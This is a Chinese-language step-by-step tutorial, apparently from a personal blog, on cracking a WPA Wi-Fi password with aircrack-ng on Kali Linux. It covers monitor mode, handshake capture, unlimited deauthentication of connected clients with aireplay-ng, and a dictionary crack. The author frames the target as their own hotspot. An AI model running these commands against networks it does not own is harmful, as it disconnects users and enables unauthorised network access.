### 1. 环境准备

| 笔记本一台                         |
| ---------------------------------- |
| kali系统（安装在笔记本vm虚拟机上） |
| usb无线网卡                        |

### 2. 插入无线网卡到笔记本

插入网卡，会提示连接本机还是虚拟机。这时候选择连接至虚拟机

#### 2.1 在kali系统中输入以下命令查看无线网卡信息

```shell
┌──(root💀kali)-[~]
└─# airmon-ng 

PHY     Interface       Driver          Chipset

phy0    wlan0           mt7601u         Xiaomi Inc. MediaTek MT7601U [MI WiFi]
```

#### 2.2 开启网卡监听模式

```shell
┌──(root💀kali)-[~]
└─# airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
  19007 NetworkManager
  36744 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           mt7601u         Xiaomi Inc. MediaTek MT7601U [MI WiFi]
                (monitor mode enabled)
```

我们可以看到输出得信息显示 monitor mode enabled，也可以使用如下命令查看网卡模式

```shell
┌──(root💀kali)-[~]
└─# iwconfig wlan0
wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
```

### 3.  扫描附近wifi热点信息

```shell
airodump-ng wlan0
```

![image-20220805105410362](https://longlizl.github.io/kali相关/images/1.png)

我以上图中我自己wifi热点来破解密码

#### 3.1 抓取握手包

```shell
命令格式：

airodump-ng -c {CH} --bssid {BSSID}  {监听接口名} -w {要保存握手包的目录及名字}
```



```
airodump-ng -c 11 --bssid 00:E0:4C:81:96:D1 wlan0 -w /root/grab
```

![image-20220805121517136](https://longlizl.github.io/kali相关/images/2.png)

#### 3.2 攻击连接wifi热点得客户端让其下线并重新连接以获取握手包

```shell
命令格式：

aireplay-ng -0 {发送反认证包的个数} -a {BSSID} -c {强制下线的MAC地址（STATION下面的地址）} 监听接口名

aireplay-ng -0 0 -a 00:E0:4C:81:96:D1 -c AC:E0:10:31:62:1F wlan0
```

如果未指定-c 参数 则攻击所有客户端让其下线

重新打开一个shell窗口执行如下命令

```
aireplay-ng -0 0 -a 00:E0:4C:81:96:D1  wlan0
#其中0表示发送无数次
```

![image-20220805121832936](https://longlizl.github.io/kali相关/images/3.png)

返回上一个终端可以看到3.1下图中已经获取到握手包信息 ctrl+c停止抓包

### 4. 使用aircrack-ng进行破解

查看抓取的包

![image-20220805131622913](https://longlizl.github.io/kali相关/images/4.png)

命令格式：aircrack-ng -w {本地的字典文件（破解的关键）} {握手包}

```shell
aircrack-ng -w pw.txt /root/grab-01.cap 
```

![image-20220805131843063](https://longlizl.github.io/kali相关/images/5.png)

上图中可以看到密码已经破解出来了 
